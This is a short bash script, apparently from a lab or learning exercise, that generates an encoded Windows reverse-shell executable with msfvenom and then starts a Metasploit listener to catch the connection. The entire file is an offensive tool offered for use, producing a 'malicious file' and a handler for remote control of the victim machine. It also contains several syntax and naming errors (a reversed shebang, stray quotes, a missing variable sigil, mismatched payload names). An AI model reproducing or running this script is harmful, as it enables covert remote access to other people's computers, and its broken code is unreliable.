!#/bin/bash

#creates the malicious file 


msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.0.2.5 LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe-o /tmp/1.exe

echo "malicious file created and saved in the path /tmp/1.exe

echo "now to setup the listener"
echo "please enter a the listening host for a reverse connection"
read LHOST1"

echo "specify a listening port"
read LPORT1

ECHO "starting the listener............."

msfconsole -q -x "use exploit/multi/handler;\ 
set LHOST $LHOST1;\
set LPORT LPORT1;\
set PAYLOAD windows/shell_reverse_tcp;\
exploit"
 


